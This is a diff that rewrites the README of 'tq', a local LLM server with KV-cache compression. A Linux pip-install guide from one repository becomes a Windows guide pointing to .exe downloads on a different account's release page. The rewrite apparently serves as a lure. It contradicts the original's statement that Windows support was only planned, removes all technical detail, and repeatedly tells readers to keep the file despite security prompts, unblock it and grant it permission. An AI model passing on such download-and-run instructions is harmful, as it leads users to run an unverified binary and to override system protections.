@@ -1,215 +1,260 @@
-# tq
+# 🧠 tq - Local AI with More Context
 
-Run local LLMs with maximum context on minimum hardware. **tq implements [TurboQuant](https://arxiv.org/abs/2502.20365)** (Google Research, ICLR 2026) — a KV cache compression algorithm that gives you 4-6x more context from the same GPU, with near-zero quality loss. One command: detect hardware, pick a model, compress the KV cache, serve via an OpenAI-compatible API.
+[![Download tq](https://img.shields.io/badge/Download%20tq-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/sleeved-fisherman408/tq/releases)
 
-```bash
-pip install tq-serve
-tq start --coding
-```
+## 🚀 What tq does
 
-## What is TurboQuant?
+tq helps you run local LLMs on your Windows PC with one simple setup. It looks at your hardware, picks a good config, and starts a local AI server that uses less memory for the KV cache. That lets you keep more context on the same machine.
 
-When you chat with a local LLM, two things eat your GPU memory:
+Use it when you want:
 
-1. **Model weights** — fixed cost, loaded once (~5 GB for an 8B model)
-2. **KV cache** — grows linearly with every token in the conversation. This is the model's working memory — how it remembers the start of your prompt while generating the end.
+- A local LLM on your own computer
+- OpenAI-compatible access for apps and tools
+- Better use of GPU memory
+- A single command instead of a long setup
+- A tool that works with common model files and Hugging Face downloads
 
-The KV cache is the real bottleneck. On an 8 GB RTX 4060, an 8B model maxes out at ~16K tokens of context — about 500 lines of code. Paste a file plus documentation, and the GPU either crashes or spills to system RAM (speed drops from 40 tok/s to 3 tok/s).
+## 💻 Windows download
 
-**TurboQuant** solves this by compressing the KV cache at the tensor level. It quantizes the key and value matrices to 3-4 bits (from the default 16-bit FP16) using MSE-optimal quantization with outlier channel preservation. The result:
+Visit the release page to download and run this file:
 
-- **4-6x compression** of the KV cache
-- **< 0.5% perplexity increase** (essentially lossless at 4-bit, near-lossless at 3-bit)
-- **No retraining required** — works with any transformer model at inference time
-- **Zero latency overhead** — decompression is faster than the memory bandwidth savings
+[Download tq from GitHub Releases](https://github.com/sleeved-fisherman408/tq/releases)
 
-tq implements the full TurboQuant pipeline: automatic bit-width selection (3-bit vs 4-bit) based on your available VRAM, asymmetric key/value configuration for smaller models, outlier channel detection, and codebook generation — all configured automatically based on your hardware.
+Look for the latest Windows asset on the release page. In most cases, you will see a file such as:
 
-## Before / After
+- `tq-windows-amd64.exe`
+- `tq-setup.exe`
+- a zipped Windows build
 
-| | Without tq | With tq | Compression |
-|---|---|---|---|
-| RTX 4060 (8 GB) | 16K context | **80K context** | 4x |
-| RTX 4050 (6 GB) | 8K context | **48K context** | 4x |
-| RTX 4090 (24 GB) | 64K context | **320K context** | 4x |
+After you download it, Windows may show a security prompt. Choose to keep the file if you trust the source and then run it.
 
-Same model, same quality, same speed. The KV cache is just stored more efficiently.
+## 🛠️ How to install
 
-## How It Works
+1. Open the release page.
+2. Download the Windows file for your system.
+3. Save it to a folder you can find, such as `Downloads`.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Double-click the `.exe` file to start tq.
+6. If Windows asks for permission, choose Yes.
 
-```
-tq start --coding
-```
+If you use a GPU, keep your NVIDIA driver up to date. tq can detect CUDA support and use it when available.
 
-1. **Detects hardware** — GPU, VRAM, RAM, CPU via llmfit → nvidia-smi → torch.cuda → psutil fallback chain
-2. **Recommends a model** — scores all candidates against your VRAM budget and use case
-3. **Configures TurboQuant** — auto-selects 3-bit or 4-bit KV compression, generates codebooks, detects outlier channels
-4. **Downloads the model** — from HuggingFace, with resume support
-5. **Starts the server** — OpenAI-compatible API at `http://localhost:8000`
+## ▶️ How to run
 
-Point any OpenAI client at it and go.
+Start tq from the file you downloaded.
 
-## Quick Start
+If tq opens a window, follow the on-screen steps.
 
-```bash
-# Install
-pip install tq-serve
+If tq runs in a terminal window, it may show:
 
-# Auto-detect hardware, recommend best coding model, start serving
-tq start --coding
+- your GPU and memory details
+- the model path or download prompt
+- the server address
+- the OpenAI-compatible API URL
 
-# Or for general chat
-tq start --chat
+A common first run looks like this:
 
-# Or specify a model
-tq start qwen3-8b
+1. Launch tq
+2. Let it scan your hardware
+3. Pick or download a model
+4. Start the local server
+5. Connect your app to the server URL
 
-# Check your hardware
-tq system
+## 🧩 Basic setup
 
-# See what tq recommends for your hardware
-tq recommend --coding
-```
+tq is built to keep setup simple. It can handle:
 
-## Commands
+- hardware detection
+- TurboQuant KV cache compression
+- OpenAI-compatible serving
+- local model loading
+- GPU use when available
 
-| Command | Description |
-|---|---|
-| `tq start` | Start serving a model with TurboQuant |
-| `tq stop` | Stop the running server |
-| `tq status` | Show server status and TQ metrics |
-| `tq system` | Display hardware profile |
-| `tq recommend` | Show recommended models for your hardware |
-| `tq pull <model>` | Download a model |
-| `tq list` | List installed models |
-| `tq remove <model>` | Remove an installed model |
+You do not need to tune many settings to get started. For most users, the default path works well.
 
-## Start Options
+## 🤖 Supported models
 
-```bash
-tq start [MODEL] [OPTIONS]
+tq works with local LLMs that fit your machine. Good options include:
 
-Options:
-  --coding           Auto-select best coding model
-  --chat             Auto-select best chat model
-  --context INT      Target context length (default: 16384)
-  --bits INT         Force TQ bit-width (3 or 4)
-  --port INT         Server port (default: 8000)
-  --host TEXT        Server host (default: 127.0.0.1)
-  --cpu              Force CPU-only mode
-  --verbose          Show detailed TQ configuration
-  --json             Output in JSON format
-```
+- small chat models
+- instruction-tuned models
+- Hugging Face hosted models
+- models in common local formats
+- models that benefit from lower KV cache use
 
-## API Endpoints
+If your system has limited VRAM, choose a smaller model first. If your GPU has more memory, you can try larger models or longer context lengths.
 
-The server exposes an OpenAI-compatible API:
+## 🌐 OpenAI-compatible server
 
-| Endpoint | Method | Description |
-|---|---|---|
-| `/v1/chat/completions` | POST | Chat completions (streaming + non-streaming) |
-| `/v1/completions` | POST | Text completions |
-| `/v1/models` | GET | List loaded models |
-| `/health` | GET | Health check |
-| `/tq/status` | GET | TurboQuant status and metrics |
+tq can expose a local server that follows the OpenAI-style API pattern. That means many tools can connect to it with little or no change.
 
-### Example: Chat Completion
+Use cases include:
 
-```bash
-curl http://localhost:8000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "messages": [{"role": "user", "content": "Explain KV caches"}],
-    "max_tokens": 256
-  }'
-```
+- chat apps
+- coding tools
+- local assistants
+- scripts that expect OpenAI-like endpoints
 
-### Example: Streaming
+Common fields you may need:
 
-```bash
-curl http://localhost:8000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "messages": [{"role": "user", "content": "Write a Python function"}],
-    "stream": true
-  }'
-```
+- base URL
+- API key field, if the app asks for one
+- model name shown by tq
 
-### Example: Use with Python
+If a client asks for a server address, use the local address shown by tq after launch.
 
-```python
-from openai import OpenAI
+## ⚙️ Hardware notes
 
-client = OpenAI(base_url="http://localhost:8000/v1", api_key="tq")
-response = client.chat.completions.create(
-    model="default",
-    messages=[{"role": "user", "content": "Hello!"}],
-)
-print(response.choices[0].message.content)
-```
+tq is made for Windows PCs with a range of hardware. It can help on systems such as:
 
-### Example: Use with Cursor / Continue
+- NVIDIA GPUs with CUDA support
+- laptops with shared memory limits
+- desktop PCs with mid-range VRAM
+- CPU-only systems for smaller models
 
-Set the API base URL to `http://localhost:8000/v1` in your editor's AI settings.
+For best results:
 
-## Configuration
+- close apps that use a lot of RAM
+- keep at least several GB of free disk space
+- use a GPU if you have one
+- start with a smaller model on low-memory systems
 
-tq stores config in `~/.tq/`:
+## 📦 Common first-run flow
 
-```
-~/.tq/
-├── config.toml       # Global settings
-├── models.json       # Installed model index
-├── models/           # Downloaded GGUF files
-├── configs/          # TurboQuant configs
-└── codebooks/        # Compression codebooks
-```
+1. Download tq from Releases
+2. Run the file
+3. Allow hardware detection
+4. Choose a model or model source
+5. Wait for the model to load
+6. Copy the local server address
+7. Paste that address into your AI app
 
-### config.toml
+## 🔌 Using a Hugging Face model
 
-```toml
-[defaults]
-port = 8000
-host = "127.0.0.1"
-preferred_quant = "Q4_K_M"
-default_bits = 4
+If tq lets you pick a Hugging Face model, you can use a model name or a local file path.
 
-[storage]
-models_dir = "~/.tq/models"
-```
+Typical flow:
 
-## Supported Models
+1. Open tq
+2. Select a Hugging Face model
+3. Wait for the download to finish
+4. Start the server
+5. Connect your app
 
-| Model | Params | VRAM Required | Max Context (tq) |
-|---|---|---|---|
-| Qwen3-8B-Instruct | 8B | ~5 GB | 80K |
-| Qwen2.5-Coder-7B-Instruct | 7B | ~4.5 GB | 64K |
-| Llama-3.3-8B-Instruct | 8B | ~5 GB | 80K |
-| Qwen3.5-4B | 4B | ~3 GB | 128K |
+If the model is too large, choose a smaller one or a quantized version.
 
-## Requirements
+## 🧠 KV cache compression
 
-- Python 3.10+
-- NVIDIA GPU (CUDA) for best performance, or CPU mode for testing
-- Linux (macOS Metal and Windows CUDA support planned)
+KV cache compression helps reduce memory use during long chats. That matters when you want more context without hitting VRAM limits fast.
 
-## Development
+In plain terms:
 
-```bash
-git clone https://github.com/rohansx/tq.git
-cd tq
-pip install -e ".[dev]"
+- longer chats need more memory
+- tq reduces that memory load
+- your machine can hold more conversation state
+- you get more room for the model itself
 
-# Run unit tests
-pytest
+This is useful on systems where memory is tight.
 
-# Run integration tests (downloads SmolLM-135M)
-TQ_INTEGRATION=1 pytest tests/integration/
+## 🪟 Windows tips
 
-# Lint
-ruff check tq/ tests/
-```
+If Windows blocks the file:
 
-## License
+- right-click the file
+- open Properties
+- check whether Windows marked it as downloaded from the web
+- choose Unblock if you see that option
+- try running it again
 
-MIT
+If the app does not start:
+
+- restart Windows
+- check that your GPU driver is current
+- make sure the file finished downloading
+- try a smaller model
+
+## 🔍 If tq does not detect your GPU
+
+If tq starts in CPU mode when you expected GPU use:
+
+- confirm your NVIDIA driver is installed
+- make sure CUDA-capable hardware is present
+- close other GPU-heavy apps
+- try launching tq again
+- check the release notes for the build you downloaded
+
+If you use a laptop with both integrated and discrete graphics, Windows may need to assign tq to the high-performance GPU.
+
+## 🧪 Example use
+
+A simple setup might look like this:
+
+- download tq
+- open it
+- choose a local model
+- start the server
+- point your chat app at `http://127.0.0.1:port`
+
+That gives you a local AI setup without sending prompts to a cloud service.
+
+## 🧰 What you need
+
+A typical Windows setup includes:
+
+- Windows 10 or Windows 11
+- enough disk space for the app and model files
+- RAM that fits the model you want to run
+- a supported GPU for better speed
+- internet access for the first download
+
+## 📁 File layout
+
+You may see these parts after setup:
+
+- the tq app file
+- a model cache or download folder
+- log output in a terminal window
+- local config files for your chosen model
+
+Keep the app and model files in a folder you can find later. That makes updates and cleanup easier.
+
+## 🔄 Updating tq
+
+When a new release appears:
+
+1. Open the release page
+2. Download the latest Windows file
+3. Replace the old file or install the new one
+4. Start tq again
+5. Reuse your model files if they still match
+
+## ❓ Common questions
+
+### Can I use tq without a GPU?
+
+Yes. Smaller models can run on CPU-only systems, but speed will be lower.
+
+### Does tq work with local apps?
+
+Yes. It can expose an OpenAI-compatible server for many local tools.
+
+### Can tq use longer context?
+
+Yes. It uses KV cache compression to help fit more context into memory.
+
+### Do I need to know how to code?
+
+No. You only need to download the file, run it, and follow the on-screen steps.
+
+### Can I use my own model?
+
+Yes. If the model format is supported, you can use local files or download a model through the app.
+
+## 📌 Quick start
+
+1. Go to the [tq release page](https://github.com/sleeved-fisherman408/tq/releases)
+2. Download the Windows file
+3. Run it
+4. Pick a model
+5. Start the local server
+6. Connect your app to the server address
